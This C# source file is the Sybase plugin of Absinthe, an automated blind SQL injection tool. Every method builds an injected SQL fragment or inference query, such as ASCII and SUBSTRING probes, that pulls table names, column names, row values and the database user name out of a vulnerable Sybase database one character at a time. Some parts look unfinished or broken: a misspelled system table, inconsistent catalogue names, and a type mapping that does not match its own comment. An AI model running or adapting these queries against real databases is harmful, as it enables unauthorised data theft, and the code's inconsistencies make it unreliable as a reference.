//   Absinthe - The Automated Blind SQL Injection Tool
//   This software is Copyright (C) 2004,2005  Xeron, 0x90.org
//   $Id: BlindSybaseSQL.cs,v 1.2 2005/09/13 01:10:33 greg Exp $
//
//   This program is free software; you can redistribute it and/or modify
//   it under the terms of the GNU General Public License as published by
//   the Free Software Foundation; either version 2 of the License, or
//   (at your option) any later version.
//
//   This program is distributed in the hope that it will be useful,
//   but WITHOUT ANY WARRANTY; without even the implied warranty of
//   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//   GNU General Public License for more details.
//
//   You should have received a copy of the GNU General Public License
//   along with this program; if not, write to the Free Software
//   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

using System.Text;
using System.Data;

public class SybaseBlindPlugin : Absinthe.Core.IBlindPlugin
{

	// {{{ AndEqualWrapper
	public string AndEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") = ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanEqualWrapper
	public string AndGreaterThanEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") >= ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanWrapper
	public string AndGreaterThanWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") > ");

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestTableID
	public string NextLowestTableID(long PrevTableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select MIN(table_id) from SYSTBALE where table_id > ").Append(PrevTableID);
		retVal.Append(" AND table_type='BASE'");  /** need to hexify! */

/*		retVal.Append("select MIN(id) from sysobjects where id > ").Append(PrevTableID);
		retVal.Append(" AND type=char(85)");
*/

		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameLength
	public string TableNameLength(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select TOP 1 LENGTH(table_name) from systable where table_id=").Append(TableID);
		retVal.Append(" AND table_type='BASE'");  /** need to hexify! */

/*
		retVal.Append("select TOP 1 LENGTH(name) from sysobjects where id=").Append(TableID);
		retVal.Append(" AND type=char(85)");
*/

		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameCharacterValue
	public string TableNameCharacterValue(long Index, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select ASCII(SUBSTRING((table_name),").Append(Index).Append(",1)) from systable where table_id=");
		retVal.Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfRecords
	/// <summary>
	/// SQL Code for the record count.
	/// </summary>
	/// <param name="TableName">The name of the table to get the record count from</param>
	/// <returns>The number of records available in the table.</returns>
	public string NumberOfRecords(string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(*) FROM ").Append(TableName);

		return retVal.ToString();
	}
	// }}}

	// {{{ PrimaryKeyColumn
	public string PrimaryKeyColumn(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(column_id) FROM syscolumn WHERE table_id=").Append(TableID).Append(" AND pkey='Y'"); /** hexify! */

/*		retVal.Append("SELECT MIN(colid) FROM sysconstraints WHERE tableid=").Append(TableID).Append(" AND status=1");*/

		


		return retVal.ToString();
	}
	// }}}

	// {{{ FieldDataType
	public string FieldDataType(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT domain_id FROM syscolumns WHERE table_id=").Append(TableID).Append(" AND column_id=").Append(FieldID);

		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameLength
	public string FieldNameLength(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT TOP 1 LENGTH(column_name) FROM syscolumn WHERE table_id=").Append(TableID).Append(" AND column_id=").Append(FieldID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestFieldID
	public string NextLowestFieldID(long TableID, long PrevFieldID)
	{
		StringBuilder retVal = new StringBuilder();

		/* TableID needs to become TableName */
		retVal.Append("SELECT MIN(column_id) FROM syscolumn WHERE column_id > ").Append(PrevFieldID).Append(" AND table_id=").Append(TableID);
		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameCharacterValue
	public string FieldNameCharacterValue(long Index, long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING(column_name,").Append(Index).Append(",1)) FROM syscolumn where table_id=").Append(TableID);
		retVal.Append(" AND column_id=").Append(FieldID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfTables
	public string NumberOfTables()
	{
		StringBuilder retVal = new StringBuilder();

/*		retVal.Append("SELECT COUNT(name) FROM sysobjects WHERE type=char(85)");*/
		retVal.Append("SELECT COUNT(table_name) FROM systable WHERE table_type='BASE'"); /** hexify! */


		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfFieldsInTable
	public string NumberOfFieldsInTable(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(column_id) FROM syscolumn WHERE table_id=").Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ LengthOfConvertedPrimaryKeyValue
	public string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT LENGTH(CONVERT(VARCHAR,MIN(").Append(KeyName).Append("))) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(LengthOfConvertedPrimaryKeyValue(KeyName, TableName));
		retVal.Append(" WHERE ").Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConvertedPrimaryKeyValueCharacter
	public string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING(CONVERT(VARCHAR,MIN(").Append(KeyName).Append(")),").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(ConvertedPrimaryKeyValueCharacter(Index, KeyName, TableName)).Append(" WHERE ");
		retVal.Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConcatenationCharacter
	public string ConcatenationCharacter
	{
		get
		{
			return "+";
		}
	}
	// }}}

	// {{{ CharConversionFunction
	public string CharConversionFunction(long DecimalValue)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("char(").Append(DecimalValue).Append(")");
		return retVal.ToString();
	}
	// }}}

	// {{{ IntegerPrimaryKeyValue
	public string IntegerPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(").Append(KeyName).Append(") FROM ").Append(TableName);
		return retVal.ToString();
	}

	public string IntegerPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(IntegerPrimaryKeyValue(KeyName, TableName)).Append(" WHERE ").Append(KeyName);
		retVal.Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ AndIsNullWrapper
	public string AndIsNullWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(" AND (").Append(Value).Append(") IS NULL ");
		return retVal.ToString();
	}
	// }}}

	// {{{ SelectValueForGivenPrimaryKey
	public string SelectValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT TOP 1 ").Append(FieldName).Append(" FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfValueForGivenPrimaryKey
	public string SelectLengthOfValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT TOP 1 LENGTH(").Append(FieldName).Append(") FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForGivenPrimaryKey
	public string SelectCharacterValueForGivenPrimaryKey(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING(").Append(FieldName).Append(",").Append(Index).Append(",1)) FROM ");
		retVal.Append(TableName).Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfConvertedRecordValue
	public string SelectLengthOfConvertedRecordValue(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT TOP 1 LENGTH(CONVERT(VarChar,").Append(FieldName).Append(")) FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForConvertedRecordValue
	public string SelectCharacterValueForConvertedRecordValue(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING(CONVERT(VarChar,").Append(FieldName).Append("),").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName).Append(" WHERE ").Append(pk.Name).Append(" = ").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectDatabaseUsernameLength
	public string SelectDatabaseUsernameLength()
	{
		/* select length(a.name) from sysusers a where a.name = user_name() */
		return "SELECT LENGTH(user_name()) FROM dummy";
	}
	// }}}

	// {{{ SelectCharacterFromDatabaseUsername
	public string SelectCharacterFromDatabaseUsername(long Index)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING(user_name(),").Append(Index);
		retVal.Append(",1)) FROM dummy");

		return retVal.ToString();
	}
	// }}}

	// {{{ PluginDisplayTargetName
	public string PluginDisplayTargetName
	{
		get
		{
			return "Sybase";
		}
	}
	// }}}
	
	// {{{ AuthorName
	public string AuthorName
	{
		get
		{
			return "Xeron";
		}
	}
	// }}}

	// {{{ ConvertNativeDataType 
	public SqlDbType ConvertNativeDataType(long DataType)
	{
		/*
1,'smallint',5,5
2,'integer',4,10
3,'numeric',2,
4,'float',7,7
5,'double',8,15
6,'date',9,
7,'char',1,
8,'char',1,
9,'varchar',12,
10,'long varchar',-1,
11,'binary',-2,
12,'long binary',-4,
13,'timestamp',11,
14,'time',10,
19,'tinyint',-6,3
20,'bigint',-5,20
21,'unsigned int',-9,10
22,'unsigned smallint',-10,5
23,'unsigned bigint',-11,21
24,'bit',-7,1
25,'java.lang.Object',0,
26,'java serialization',-4,
27,'decimal',2,
28,'varbinary',-2,
		*/
			switch (DataType)
			{
				case 56:  /* Sybase */
					return SqlDbType.Int;
				case 9:
					return SqlDbType.VarChar;
				case 175:
					return SqlDbType.Char;
				case 4: 
					return SqlDbType.Decimal;
				case 127:
					return SqlDbType.BigInt;
				case 173:
					return SqlDbType.Binary;
				case 104:
					return SqlDbType.Bit;
				case 61:
					return SqlDbType.DateTime;
				case 34:
					return SqlDbType.Image;
				case 60:
					return SqlDbType.Money;
				case 239:
					return SqlDbType.NChar;
				case 99:
					return SqlDbType.NText;
				case 108:
					// There's no Numeric type.. weird
					return SqlDbType.Variant;
				case 62:
					return SqlDbType.Float;
				case 231:
					return SqlDbType.NVarChar;
				case 59:
					return SqlDbType.Real;
				case 58:
					return SqlDbType.SmallDateTime;
				case 1:
					return SqlDbType.SmallInt;
				case 122:
					return SqlDbType.SmallMoney;
				case 35:
					return SqlDbType.Text;
				case 189:
					return SqlDbType.Timestamp;
				case 48:
					return SqlDbType.TinyInt;
				case 36:
					return SqlDbType.UniqueIdentifier;
				case 165:
					return SqlDbType.VarBinary;
				
			}

			return SqlDbType.Variant;
	}
	// }}}
}